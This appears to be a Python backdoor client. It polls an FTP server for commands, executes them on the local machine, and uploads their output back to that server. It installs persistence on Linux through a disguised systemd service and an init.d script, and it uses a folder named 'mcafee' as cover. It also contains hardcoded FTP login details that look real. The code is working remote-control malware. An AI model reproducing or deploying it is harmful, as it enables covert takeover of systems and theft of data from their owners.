from ftplib import FTP
import io
import subprocess
import os
import time
import sys

delimiter = '\n-#$#-\n'
parent_dir = "mcafee"

class cmdFile:
    def __init__(self, session):
        self.proxy_ip = input("\nEnter IP: ") or "136.233.9.51"#sys.stdin.readline().replace("\n", "")
        self.proxy_port = int(input("\nEnter Port: ") or "21")#int(sys.stdin.readline().replace("\n", "") or "21")#input("\nEnter Port: ") or "21")
        self.proxy_user = input("\nEnter User: ") or "16BCE0707"#sys.stdin.readline().replace("\n", "")#input("\nEnter User: ") or "anonymous"
        self.proxy_pass = input("\nEnter Pass: ") or "84717769"#sys.stdin.readline().replace("\n", "")#input("\nEnter Pass: ") or "anonymous"
        self.proxy_user = "16BCE0707"
    #sys.stdin.
        #for line in sys.stdin:
        #    print(line)
        #    print("asd")
        #print("asd")
        print(self.proxy_ip)
        print(self.proxy_port)
        print(self.proxy_user)
        print(self.proxy_pass)
        #raise Exception("Help")
        self.session = session
        self.pwd = "/tmp"
        self.oo = b''
        self.ss = ''
        self.connectFtp()
        self.session_file = open(self.session + 'cm', 'w+')     # Save the command in local log file
        self.session_file.close()
        try:
            self.ftp.mkd(parent_dir)
        except Exception as e:
            print("some error 0x1 ")
            print(e)
        try:
            self.ftp.cwd(parent_dir)
        except Exception as e:
            print("some error 0x3 ")
            print(e)
        return 
    def connectFtp(self):
        try:
            self.ftp = FTP()
            self.ftp.connect(self.proxy_ip, self.proxy_port)
            self.ftp.login(self.proxy_user, self.proxy_pass)
        except Exception as e:
            print(e)
            self.connectFtp()
        return 
    def putCommand(self, cmd):
        self.session_file = open(self.session + '.cm', 'ab')     # Save the command in local log file
        #s = self.session_file.read()
        self.session_file.write(bytes(delimiter + cmd, 'ascii'))
        self.session_file.close()
        try:
            self.getCommandFile()
            if len(self.ss) > 0:
                print(self.ss)
                print("\nWait, last command did not finished")
                return
            bio = io.BytesIO(b'')
            self.ftp.storbinary('STOR ' + self.session + '.oo', bio)    # Clean last output
            print("...")
            bio = io.BytesIO(bytes(cmd, 'ascii'))
            print("...")
            print(bio)
            self.ftp.storbinary('STOR ' + self.session + '.cm', bio)
            print("\nCommand Delivered!")
        except Exception as e:
            print("some error 0x2")
            print(e)
        return 
    def executeCommand(self):
        self.getCommandFile()
        if len(self.ss) == 0:
            raise Exception("No Command")
        print("Executing\n")
        print(self.ss)
        #need to clear the file now
        try:
            bio = io.BytesIO(b'')
            self.ftp.storbinary('STOR ' + self.session + '.cm', bio)
            oop = subprocess.getoutput(self.ss)
            print(oop)
            self.ss = ''
            #self.getOutputFile()
            self.oo += bytes(delimiter + oop, 'ascii')
            print(oop)
        except: 
            self.oo += delimiter + oop
        try:
            bio = io.BytesIO(self.oo)   # Save this output into a complete outputs file
            self.ftp.storbinary('STOR ' + self.session + '.op', bio)
            bio = io.BytesIO(bytes(oop, 'ascii'))   # Save this output into a file
            self.ftp.storbinary('STOR ' + self.session + '.oo', bio)
        except Exception as e:
            print("some error 0x5")
            print(e)
        return 
    def getCommandFile(self):
        self.ss = ''
        try:
            self.tmpfile = open('tmp'+self.session+'.cm', 'wb')
            self.ftp.retrbinary("RETR " + self.session + '.cm', self.tmpfile.write)
            self.tmpfile.close()
        except Exception as e:
            pass
            #print("Error 0x41")
            # Create a blank file
            #print(e)
        try:
            self.tmpfile = open('tmp'+self.session+'.cm', 'rb')
            self.ss = self.tmpfile.read()
            self.tmpfile.close()
        except Exception as e:
            print("Error 0x42")
            print(e)
            #bio = io.BytesIO(b'uname -a')
            #self.ftp.storbinary('STOR ' + self.session + '.cm', bio)
        return self.ss
    def getLastOutput(self):
        self.oo = b''
        try:
            self.tmpfile = open('tmp'+self.session+'.oo', 'wb')
            self.ftp.retrbinary("RETR " + self.session + '.oo', self.tmpfile.write)
            self.tmpfile.close()
            self.tmpfile = open('tmp'+self.session+'.oo', 'rb')
            self.oo = self.tmpfile.read()
            self.tmpfile.close()
        except:
            #bio = io.BytesIO(b'')
            #self.ftp.storbinary('STOR ' + self.session + '.oo', bio)
            pass
        return self.oo
    def getOutputFile(self):
        self.oo = b''
        try:
            self.tmpfile = open('tmp'+self.session+'.op', 'wb')
            self.ftp.retrbinary("RETR " + self.session + '.op', self.tmpfile.write)
            self.tmpfile.close()
            self.tmpfile = open('tmp'+self.session+'.op', 'rb')
            self.oo = self.tmpfile.read()
            self.tmpfile.close()
        except:
            #bio = io.BytesIO(b'')
            #self.ftp.storbinary('STOR ' + self.session + '.op', bio)
            pass
        return self.oo
    def setPersistance(self, scriptname):
        try:
            f = open("/lib/systemd/system/"+scriptname+".service", "wb")
            s = "[Unit]\nDescription=Something Special Again\nType=idle\n\n[Service]\nExecStart="+self.pwd+"/"+scriptname+".sh\n\n[Install]\nWantedBy=multi-user.target"
            f.write(s)
            f.close()
        except:
            print("")
        os.system("cp "+self.pwd+"/"+scriptname+".sh /etc/init.d/\nupdate-rc.d "+scriptname+".sh defaults\nservice "+scriptname+".sh start") 
        return  
    def linux_python_ScriptCreate(self, payload, scriptname):
        f = open(self.pwd+"/"+scriptname+".py", "wb")
        f.write(payload)
        f.close()
        os.system("chmod +x "+self.pwd+"/"+scriptname+".py")
        s = subprocess.check_output(['which', 'python'])
        s = s[:len(s)-1]
        f = open(self.pwd+"/"+scriptname+".sh", "wb")
        s = "#!/bin/sh\n(nohup " + str(s) + " " + self.pwd+"/"+scriptname+".py &)\n"
        f.write(s)
        f.close()
        os.system("chmod +x "+self.pwd+"/"+scriptname+".sh\nsh "+self.pwd+"/"+scriptname+".sh")

c = cmdFile('demo3')
try:
    c.linux_python_ScriptCreate(open('./client.py', 'rb').read(),'ss1')
    c.setPersistance("ss1")
except Exception as e:
    print(e)

while True:
    try:
        c.executeCommand()
    except Exception as e:
        #print("\nError2")
        print(e)
        time.sleep(1)
